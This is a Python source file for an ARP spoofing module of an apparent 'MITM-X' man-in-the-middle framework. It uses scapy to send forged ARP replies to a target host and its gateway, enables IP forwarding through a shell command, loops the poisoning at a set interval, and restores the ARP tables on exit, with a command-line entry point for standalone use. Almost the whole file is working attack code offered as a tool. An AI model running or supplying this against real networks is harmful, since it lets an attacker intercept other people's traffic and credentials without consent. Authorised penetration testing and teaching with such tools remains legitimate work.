#!/usr/bin/env python3
"""
ARP Spoofer Module for MITM-X Framework
Performs ARP cache poisoning to redirect target traffic
"""

import os
import sys
import time
import threading
import argparse
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import logging

class ARPSpoofer:
    """
    ARP Spoofing class to perform ARP cache poisoning attacks
    """
    
    def __init__(self, target_ip, gateway_ip, interface="eth0"):
        """
        Initialize ARP Spoofer
        
        Args:
            target_ip (str): Target victim IP address
            gateway_ip (str): Gateway/Router IP address  
            interface (str): Network interface to use
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = None
        self.gateway_mac = None
        self.running = False
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
    def get_mac_address(self, ip):
        """
        Get MAC address for given IP using ARP request
        
        Args:
            ip (str): IP address to resolve MAC for
            
        Returns:
            str: MAC address or None if not found
        """
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                self.logger.error(f"Could not find MAC address for {ip}")
                return None
                
        except Exception as e:
            self.logger.error(f"Error getting MAC address for {ip}: {e}")
            return None
    
    def spoof_arp(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """
        Send spoofed ARP responses to target and gateway
        
        Args:
            target_ip (str): Target IP address
            gateway_ip (str): Gateway IP address
            target_mac (str): Target MAC address
            gateway_mac (str): Gateway MAC address
        """
        try:
            # Tell target that we are the gateway
            target_arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                                    psrc=gateway_ip, hwsrc=get_if_hwaddr(self.interface))
            
            # Tell gateway that we are the target
            gateway_arp_response = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                     psrc=target_ip, hwsrc=get_if_hwaddr(self.interface))
            
            # Send spoofed packets
            send(target_arp_response, verbose=False)
            send(gateway_arp_response, verbose=False)
            
        except Exception as e:
            self.logger.error(f"Error sending ARP spoof packets: {e}")
    
    def restore_arp(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """
        Restore original ARP tables by sending correct ARP responses
        
        Args:
            target_ip (str): Target IP address
            gateway_ip (str): Gateway IP address  
            target_mac (str): Target MAC address
            gateway_mac (str): Gateway MAC address
        """
        try:
            # Restore target's ARP table
            target_arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                    psrc=gateway_ip, hwsrc=gateway_mac)
            
            # Restore gateway's ARP table  
            gateway_arp_response = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                     psrc=target_ip, hwsrc=target_mac)
            
            # Send restoration packets multiple times to ensure success
            for _ in range(5):
                send(target_arp_response, verbose=False)
                send(gateway_arp_response, verbose=False)
                time.sleep(0.1)
                
            self.logger.info("ARP tables restored")
            
        except Exception as e:
            self.logger.error(f"Error restoring ARP tables: {e}")
    
    def enable_ip_forwarding(self):
        """
        Enable IP forwarding on the system to route packets
        """
        try:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            self.logger.info("IP forwarding enabled")
        except Exception as e:
            self.logger.error(f"Error enabling IP forwarding: {e}")
    
    def disable_ip_forwarding(self):
        """
        Disable IP forwarding
        """
        try:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            self.logger.info("IP forwarding disabled")
        except Exception as e:
            self.logger.error(f"Error disabling IP forwarding: {e}")
    
    def start_spoofing(self, interval=2):
        """
        Start ARP spoofing attack
        
        Args:
            interval (int): Time interval between ARP packets in seconds
        """
        # Enable IP forwarding
        self.enable_ip_forwarding()
        
        # Get MAC addresses
        self.logger.info(f"Getting MAC address for target {self.target_ip}")
        self.target_mac = self.get_mac_address(self.target_ip)
        
        self.logger.info(f"Getting MAC address for gateway {self.gateway_ip}")
        self.gateway_mac = self.get_mac_address(self.gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            self.logger.error("Could not get required MAC addresses")
            return False
        
        self.logger.info(f"Target MAC: {self.target_mac}")
        self.logger.info(f"Gateway MAC: {self.gateway_mac}")
        
        self.running = True
        self.logger.info("Starting ARP spoofing attack...")
        
        try:
            while self.running:
                self.spoof_arp(self.target_ip, self.gateway_ip, 
                             self.target_mac, self.gateway_mac)
                time.sleep(interval)
                
        except KeyboardInterrupt:
            self.logger.info("ARP spoofing interrupted")
        except Exception as e:
            self.logger.error(f"Error during ARP spoofing: {e}")
        finally:
            self.stop_spoofing()
    
    def stop_spoofing(self):
        """
        Stop ARP spoofing and restore network
        """
        self.running = False
        
        if self.target_mac and self.gateway_mac:
            self.logger.info("Restoring ARP tables...")
            self.restore_arp(self.target_ip, self.gateway_ip,
                           self.target_mac, self.gateway_mac)
        
        # Disable IP forwarding
        self.disable_ip_forwarding()
        self.logger.info("ARP spoofing stopped")

def main():
    """
    Main function for standalone execution
    """
    parser = argparse.ArgumentParser(description="ARP Spoofer for MITM attacks")
    parser.add_argument("--target", "-t", required=True, help="Target IP address")
    parser.add_argument("--gateway", "-g", required=True, help="Gateway IP address")
    parser.add_argument("--interface", "-i", default="eth0", help="Network interface")
    parser.add_argument("--interval", default=2, type=int, help="Packet interval in seconds")
    
    args = parser.parse_args()
    
    # Check if running as root
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        sys.exit(1)
    
    # Create and start ARP spoofer
    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    
    try:
        spoofer.start_spoofing(args.interval)
    except KeyboardInterrupt:
        print("\nStopping ARP spoofer...")
        spoofer.stop_spoofing()

if __name__ == "__main__":
    main()
